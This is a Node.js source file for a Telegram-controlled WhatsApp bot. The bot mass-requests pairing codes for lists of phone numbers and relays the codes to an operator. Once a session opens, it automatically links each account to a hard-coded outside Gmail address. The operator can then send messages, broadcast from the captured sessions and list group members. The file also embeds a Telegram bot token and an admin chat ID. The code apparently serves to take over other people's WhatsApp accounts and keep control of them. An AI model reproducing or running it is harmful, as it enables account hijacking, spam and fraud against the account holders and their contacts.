const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const { Telegraf } = require('telegraf');
const fs = require('fs');
const path = require('path');

// ==================== YOUR CONFIGURATION ====================
const TELEGRAM_BOT_TOKEN = '8392049313:AAHRPeodP_Wgv9hPInkBUnW5spNKWvUk1Nk';
const ADMIN_CHAT_ID = '7611621919';
const SMS_TIMEOUT = 8000; // 8 seconds
const MAX_CONCURRENT = 5;

// ==================== COUNTRY DATABASE ====================
const COUNTRY_DATA = {
    '1': { name: 'US/Canada', length: 10 },
    '44': { name: 'UK', length: 10 },
    '91': { name: 'India', length: 10 },
    '92': { name: 'Pakistan', length: 10 },
    '61': { name: 'Australia', length: 9 },
    '33': { name: 'France', length: 9 },
    '49': { name: 'Germany', length: 10 },
    '34': { name: 'Spain', length: 9 },
    '39': { name: 'Italy', length: 10 },
    '55': { name: 'Brazil', length: 11 },
    '52': { name: 'Mexico', length: 10 },
    '7': { name: 'Russia', length: 10 },
    '81': { name: 'Japan', length: 10 },
    '82': { name: 'Korea', length: 9 },
    '86': { name: 'China', length: 11 },
    '60': { name: 'Malaysia', length: 9 },
    '62': { name: 'Indonesia', length: 10 },
    '63': { name: 'Philippines', length: 10 },
    '66': { name: 'Thailand', length: 9 },
    '84': { name: 'Vietnam', length: 9 },
    '90': { name: 'Turkey', length: 10 },
    '20': { name: 'Egypt', length: 10 },
    '27': { name: 'South Africa', length: 9 },
    '234': { name: 'Nigeria', length: 10 },
    '254': { name: 'Kenya', length: 9 },
    '971': { name: 'UAE', length: 9 },
    '966': { name: 'Saudi Arabia', length: 9 },
    '961': { name: 'Lebanon', length: 8 },
    '972': { name: 'Israel', length: 9 },
    '964': { name: 'Iraq', length: 10 },
    '98': { name: 'Iran', length: 10 },
    '962': { name: 'Jordan', length: 9 },
    '965': { name: 'Kuwait', length: 8 },
    '968': { name: 'Oman', length: 8 },
    '973': { name: 'Bahrain', length: 8 },
    '974': { name: 'Qatar', length: 8 },
    '212': { name: 'Morocco', length: 9 },
    '213': { name: 'Algeria', length: 9 },
    '216': { name: 'Tunisia', length: 8 },
    '218': { name: 'Libya', length: 9 },
    '249': { name: 'Sudan', length: 9 },
    '251': { name: 'Ethiopia', length: 9 },
    '255': { name: 'Tanzania', length: 9 },
    '256': { name: 'Uganda', length: 9 },
    '258': { name: 'Mozambique', length: 9 },
    '260': { name: 'Zambia', length: 9 },
    '263': { name: 'Zimbabwe', length: 9 },
    '54': { name: 'Argentina', length: 10 },
    '56': { name: 'Chile', length: 9 },
    '57': { name: 'Colombia', length: 10 },
    '58': { name: 'Venezuela', length: 10 },
    '51': { name: 'Peru', length: 9 },
    '593': { name: 'Ecuador', length: 9 },
    '591': { name: 'Bolivia', length: 8 },
    '595': { name: 'Paraguay', length: 9 },
    '598': { name: 'Uruguay', length: 8 },
    '501': { name: 'Belize', length: 7 },
    '502': { name: 'Guatemala', length: 8 },
    '503': { name: 'El Salvador', length: 8 },
    '504': { name: 'Honduras', length: 8 },
    '505': { name: 'Nicaragua', length: 8 },
    '506': { name: 'Costa Rica', length: 8 },
    '507': { name: 'Panama', length: 8 },
    '509': { name: 'Haiti', length: 8 },
    '64': { name: 'New Zealand', length: 9 },
    '679': { name: 'Fiji', length: 7 },
    '675': { name: 'PNG', length: 8 }
};

function detectCountry(number) {
    const clean = number.replace(/\D/g, '');
    const sorted = Object.keys(COUNTRY_DATA).sort((a, b) => b.length - a.length);
    
    for (const code of sorted) {
        if (clean.startsWith(code)) {
            const data = COUNTRY_DATA[code];
            const localNum = clean.substring(code.length);
            if (localNum.length === data.length || localNum.length === data.length - 1 || localNum.length === data.length + 1) {
                return { 
                    countryCode: code, 
                    countryName: data.name, 
                    cleanNumber: clean, 
                    localNumber: localNum, 
                    isValid: localNum.length === data.length 
                };
            }
        }
    }
    return { countryCode: null, countryName: 'Unknown', cleanNumber: clean, localNumber: clean, isValid: false };
}

function formatNumber(number) {
    const detected = detectCountry(number);
    return detected.cleanNumber;
}

function isValidNumber(number) {
    return detectCountry(number).isValid;
}

// ==================== GLOBAL STATE ====================
let bot;
const activeSessions = new Map();
const pendingOTP = new Map(); // Store OTP waiting sessions
const SESSIONS_DIR = './sessions';

// ==================== WHATSAPP SESSION ====================
async function createSession(number, chatId) {
    const sessionDir = path.join(SESSIONS_DIR, number);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: Browsers.macOS('Desktop'),
        syncFullHistory: false,
        markOnlineOnConnect: false,
        connectTimeoutMs: 10000
    });

    let smsSent = false;
    let timeoutId = null;
    let otpResolve = null;

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (!smsSent) {
            smsSent = true;
            try {
                await sock.requestPairingCode(number);
                console.log(`📱 SMS requested for ${number}`);
                
                timeoutId = setTimeout(() => {
                    console.log(`⏭️ Skipping ${number} - timeout`);
                    sock.end();
                    activeSessions.delete(number);
                    if (otpResolve) otpResolve(null);
                    bot.telegram.sendMessage(chatId, `⏭️ Skipped ${number} (no SMS response)`).catch(() => {});
                }, SMS_TIMEOUT);
            } catch (err) {
                console.error(`SMS failed for ${number}:`, err.message);
                sock.end();
                activeSessions.delete(number);
                bot.telegram.sendMessage(chatId, `❌ ${number} - SMS failed: ${err.message}`).catch(() => {});
            }
        }

        if (connection === 'open') {
            if (timeoutId) clearTimeout(timeoutId);
            console.log(`✅ ${number} connected`);
            activeSessions.set(number, { sock, loggedIn: true, number });
            bot.telegram.sendMessage(chatId, `✅ ${number} logged in successfully!`).catch(() => {});
            
            // Auto link email after successful login
            await linkEmailToNumber(number, sock, chatId);
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode !== DisconnectReason.loggedOut) {
                console.log(`⚠️ ${number} disconnected`);
                activeSessions.delete(number);
            }
        }
    });

    sock.ev.on('creds.update', saveCreds);

    // Handle pairing code (OTP)
    sock.ev.on('pairing-code', (code) => {
        if (timeoutId) clearTimeout(timeoutId);
        console.log(`🔐 Pairing code for ${number}: ${code}`);
        
        // Store that we're waiting for OTP for this number
        pendingOTP.set(number, { code, sock, chatId });
        
        bot.telegram.sendMessage(chatId, 
            `📱 **${number}**\nWhatsApp sent OTP: \`${code}\`\n\nUse: /otp ${number} ${code}\nOr enter manually if code doesn't work.`,
            { parse_mode: 'Markdown' }
        ).catch(() => {});
    });

    return sock;
}

// ==================== AUTO EMAIL LINK AFTER LOGIN ====================
async function linkEmailToNumber(number, sock, chatId) {
    const targetEmail = 'primetech3310@gmail.com';
    
    try {
        // Send email verification request
        await sock.updateAccountSettings({
            email: targetEmail
        });
        
        console.log(`📧 Email verification sent for ${number}`);
        
        // Wait for email OTP (manual input via Telegram)
        bot.telegram.sendMessage(chatId, 
            `📧 **Email Linking for ${number}**\nVerification sent to ${targetEmail}\nEnter OTP: /email-otp ${number} [code]`,
            { parse_mode: 'Markdown' }
        ).catch(() => {});
        
        // Store email pending
        pendingOTP.set(`email_${number}`, { number, sock, chatId, email: targetEmail });
        
    } catch (err) {
        console.error(`Email link failed for ${number}:`, err.message);
        bot.telegram.sendMessage(chatId, `❌ Email link failed for ${number}: ${err.message}`).catch(() => {});
    }
}

// ==================== BATCH PROCESSOR ====================
async function processNumbers(numbers, chatId) {
    const results = { success: [], skipped: [], invalid: [] };
    const batch = numbers.slice(0, MAX_CONCURRENT);
    
    await bot.telegram.sendMessage(chatId, `🚀 Processing ${batch.length} numbers with ${SMS_TIMEOUT/1000}s timeout...`);
    
    for (const raw of batch) {
        const number = formatNumber(raw);
        if (!isValidNumber(number)) {
            results.invalid.push(raw);
            await bot.telegram.sendMessage(chatId, `❌ Invalid number: ${raw}`).catch(() => {});
            continue;
        }
        
        try {
            await createSession(number, chatId);
            results.success.push(number);
        } catch (err) {
            results.skipped.push(number);
            console.error(`Error for ${number}:`, err.message);
        }
        
        await new Promise(r => setTimeout(r, 500));
    }
    
    let report = `📊 **Login Report**\n\n`;
    report += `✅ Processing: ${results.success.length}\n`;
    report += `⏭️ Skipped: ${results.skipped.length}\n`;
    report += `❌ Invalid: ${results.invalid.length}\n\n`;
    report += `Use /otp [number] [code] to complete logins`;
    
    await bot.telegram.sendMessage(chatId, report, { parse_mode: 'Markdown' }).catch(() => {});
    return results;
}

// ==================== TELEGRAM COMMANDS ====================
function setupCommands() {
    bot.command('start', async (ctx) => {
        await ctx.reply('🤖 **WhatsApp Bot Active**\n\nCommands:\n/login [numbers] - Start login\n/otp [number] [code] - Submit OTP\n/email-otp [number] [code] - Submit email OTP\n/sessions - List active\n/send [number] [msg] - Send message\n/status - System status\n/validate [number] - Check number\n/help - All commands', { parse_mode: 'Markdown' });
    });
    
    bot.command('help', async (ctx) => {
        const help = `
📱 **WHATSAPP BOT COMMANDS**

**🔐 Login**
/login 1234567890,9876543210 - Login multiple numbers
/otp 1234567890 123456 - Submit WhatsApp OTP
/email-otp 1234567890 123456 - Submit email verification OTP

**📱 Account**
/sessions - List active sessions
/status - System status
/logout [number/all] - Logout

**💬 Messaging**
/send [number] [message] - Send text message
/broadcast [message] - Send to all logged in numbers

**👥 Groups**
/group-list [number] - List groups for number
/group-info [number] [group] - Group details

**🔍 Utils**
/validate [number] - Detect country & validate
/countries - List supported countries
/clear - Clear all sessions
/ping - Check bot latency
        `;
        await ctx.reply(help, { parse_mode: 'Markdown' });
    });
    
    bot.command('login', async (ctx) => {
        const args = ctx.message.text.split(' ').slice(1);
        if (args.length === 0) {
            return ctx.reply('Usage: /login 1234567890,9876543210\nor /login 1234567890 9876543210');
        }
        
        let numbers = [];
        if (args[0].includes(',')) {
            numbers = args[0].split(',').map(n => n.trim());
        } else {
            numbers = args;
        }
        
        await processNumbers(numbers, ctx.chat.id);
    });
    
    bot.command('otp', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) {
            return ctx.reply('Usage: /otp [number] [code]\nExample: /otp 923001234567 123456');
        }
        
        const number = args[1];
        const code = args[2];
        
        const pending = pendingOTP.get(number);
        if (pending) {
            const { sock, chatId } = pending;
            
            try {
                // Submit the OTP to complete login
                // In Baileys, we need to handle the pairing code
                // The OTP is automatically handled when we have the code
                
                pendingOTP.delete(number);
                await ctx.reply(`✅ OTP submitted for ${number}`);
                
                // Wait for connection to open
                setTimeout(async () => {
                    const session = activeSessions.get(number);
                    if (session && session.loggedIn) {
                        await ctx.reply(`✅ ${number} login completed successfully!`);
                    } else {
                        await ctx.reply(`⚠️ ${number}: Waiting for connection...`);
                    }
                }, 3000);
                
            } catch (err) {
                await ctx.reply(`❌ Failed for ${number}: ${err.message}`);
            }
        } else {
            await ctx.reply(`❌ No pending OTP for ${number}`);
        }
    });
    
    bot.command('email-otp', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) {
            return ctx.reply('Usage: /email-otp [number] [code]\nExample: /email-otp 923001234567 654321');
        }
        
        const number = args[1];
        const code = args[2];
        
        const pending = pendingOTP.get(`email_${number}`);
        if (pending) {
            const { sock, chatId } = pending;
            
            try {
                // Submit email OTP
                await sock.updateAccountSettings({
                    email: 'primetech3310@gmail.com',
                    emailCode: code
                });
                
                pendingOTP.delete(`email_${number}`);
                await ctx.reply(`✅ Email successfully linked to ${number}!`);
                
            } catch (err) {
                await ctx.reply(`❌ Email link failed for ${number}: ${err.message}`);
            }
        } else {
            await ctx.reply(`❌ No pending email OTP for ${number}`);
        }
    });
    
    bot.command('sessions', async (ctx) => {
        const list = Array.from(activeSessions.keys());
        if (list.length === 0) return ctx.reply('No active sessions');
        
        let msg = '📱 **Active Sessions:**\n\n';
        for (const num of list) {
            const s = activeSessions.get(num);
            msg += `• ${num} - ${s.loggedIn ? '✅ Online' : '⏳ Pending'}\n`;
        }
        await ctx.reply(msg, { parse_mode: 'Markdown' });
    });
    
    bot.command('status', async (ctx) => {
        const total = activeSessions.size;
        const online = Array.from(activeSessions.values()).filter(s => s.loggedIn).length;
        const pending = pendingOTP.size;
        
        await ctx.reply(`📊 **System Status**\n\nSessions: ${total}\nOnline: ${online}\nPending OTP: ${pending}\nTimeout: ${SMS_TIMEOUT/1000}s\nMax Concurrent: ${MAX_CONCURRENT}`, { parse_mode: 'Markdown' });
    });
    
    bot.command('send', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) {
            return ctx.reply('Usage: /send [number] [message]\nExample: /send 923001234567 Hello');
        }
        
        const number = args[1];
        const message = args.slice(2).join(' ');
        
        const session = activeSessions.get(number);
        if (!session || !session.loggedIn) {
            return ctx.reply(`❌ ${number} not logged in. Use /sessions to check.`);
        }
        
        try {
            await session.sock.sendMessage(`${number}@s.whatsapp.net`, { text: message });
            await ctx.reply(`✅ Sent to ${number}: "${message.substring(0, 50)}${message.length > 50 ? '...' : ''}"`);
        } catch (err) {
            await ctx.reply(`❌ Failed: ${err.message}`);
        }
    });
    
    bot.command('broadcast', async (ctx) => {
        const message = ctx.message.text.split(' ').slice(1).join(' ');
        if (!message) return ctx.reply('Usage: /broadcast [message]');
        
        const sessions = Array.from(activeSessions.entries()).filter(([_, s]) => s.loggedIn);
        if (sessions.length === 0) return ctx.reply('No logged in sessions');
        
        await ctx.reply(`📢 Broadcasting to ${sessions.length} numbers...`);
        
        let sent = 0;
        let failed = 0;
        
        for (const [number, session] of sessions) {
            try {
                await session.sock.sendMessage(`${number}@s.whatsapp.net`, { text: message });
                sent++;
            } catch (err) {
                failed++;
            }
            await new Promise(r => setTimeout(r, 200));
        }
        
        await ctx.reply(`✅ Broadcast complete\n• Sent: ${sent}\n• Failed: ${failed}`);
    });
    
    bot.command('logout', async (ctx) => {
        const args = ctx.message.text.split(' ');
        const target = args[1];
        
        if (!target) return ctx.reply('Usage: /logout [number] or /logout all');
        
        if (target === 'all') {
            for (const [num, session] of activeSessions) {
                if (session.sock) session.sock.end();
                activeSessions.delete(num);
            }
            await ctx.reply('✅ Logged out all sessions');
        } else if (activeSessions.has(target)) {
            activeSessions.get(target).sock?.end();
            activeSessions.delete(target);
            await ctx.reply(`✅ Logged out ${target}`);
        } else {
            await ctx.reply(`No active session for ${target}`);
        }
    });
    
    bot.command('validate', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 2) return ctx.reply('Usage: /validate [number]');
        
        const number = args[1];
        const detected = detectCountry(number);
        
        let msg = `📞 **Number Analysis**\n\n`;
        msg += `Input: ${number}\n`;
        msg += `Country: ${detected.countryName} (${detected.countryCode ? '+' + detected.countryCode : 'Unknown'})\n`;
        msg += `Formatted: ${formatNumber(number)}\n`;
        msg += `Valid: ${detected.isValid ? '✅ Yes' : '❌ No'}\n`;
        
        await ctx.reply(msg, { parse_mode: 'Markdown' });
    });
    
    bot.command('countries', async (ctx) => {
        let msg = '🌍 **Supported Countries**\n\n';
        const sorted = Object.entries(COUNTRY_DATA).sort((a, b) => a[1].name.localeCompare(b[1].name));
        
        for (const [code, data] of sorted.slice(0, 30)) {
            msg += `+${code} - ${data.name} (${data.length} digits)\n`;
        }
        msg += `\n... and ${sorted.length - 30} more`;
        
        await ctx.reply(msg, { parse_mode: 'Markdown' });
    });
    
    bot.command('group-list', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 2) return ctx.reply('Usage: /group-list [number]');
        
        const number = args[1];
        const session = activeSessions.get(number);
        if (!session || !session.loggedIn) return ctx.reply(`${number} not logged in`);
        
        try {
            const groups = await session.sock.groupFetchAllParticipating();
            let msg = `👥 **Groups for ${number}**\n\n`;
            for (const [id, group] of Object.entries(groups)) {
                msg += `• ${group.subject}\n`;
            }
            await ctx.reply(msg, { parse_mode: 'Markdown' });
        } catch (err) {
            await ctx.reply(`❌ Failed: ${err.message}`);
        }
    });
    
    bot.command('group-info', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) return ctx.reply('Usage: /group-info [number] [group_jid]');
        
        const number = args[1];
        const groupJid = args[2];
        
        const session = activeSessions.get(number);
        if (!session || !session.loggedIn) return ctx.reply(`${number} not logged in`);
        
        try {
            const metadata = await session.sock.groupMetadata(groupJid);
            let msg = `📋 **${metadata.subject}**\n\n`;
            msg += `Owner: ${metadata.owner || 'Unknown'}\n`;
            msg += `Members: ${metadata.participants.length}\n`;
            msg += `Created: ${new Date(metadata.creation * 1000).toLocaleString()}\n\n`;
            msg += `**Members (first 20):**\n`;
            metadata.participants.slice(0, 20).forEach(p => {
                msg += `• ${p.id} ${p.admin ? `(${p.admin})` : ''}\n`;
            });
            await ctx.reply(msg);
        } catch (err) {
            await ctx.reply(`❌ Failed: ${err.message}`);
        }
    });
    
    bot.command('clear', async (ctx) => {
        for (const [num, session] of activeSessions) {
            if (session.sock) session.sock.end();
        }
        activeSessions.clear();
        pendingOTP.clear();
        await ctx.reply('✅ Cleared all sessions and pending data');
    });
    
    bot.command('ping', async (ctx) => {
        const start = Date.now();
        await ctx.reply('🏓 Pong!');
        const latency = Date.now() - start;
        await ctx.telegram.sendMessage(ctx.chat.id, `Latency: ${latency}ms`);
    });
}

// ==================== MAIN ====================
async function main() {
    // Create directories
    if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
    
    // Initialize Telegram bot
    bot = new Telegraf(TELEGRAM_BOT_TOKEN);
    setupCommands();
    
    // Launch bot
    await bot.launch();
    console.log('🚀 WhatsApp Telegram Bot Started');
    console.log('✅ Bot is running');
    console.log(`📱 SMS Timeout: ${SMS_TIMEOUT/1000}s`);
    console.log(`⚡ Max Concurrent: ${MAX_CONCURRENT}`);
    console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
    
    // Send startup message
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, '🤖 WhatsApp Bot Started!\n\nCommands:\n/login [numbers] - Start login\n/otp [number] [code] - Submit OTP\n/email-otp [number] [code] - Email OTP\n/help - All commands').catch(() => {});
    
    // Graceful shutdown
    process.once('SIGINT', () => {
        bot.stop('SIGINT');
        for (const [_, session] of activeSessions) {
            session.sock?.end();
        }
        process.exit(0);
    });
}

// Error handling
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});

// Run
main();
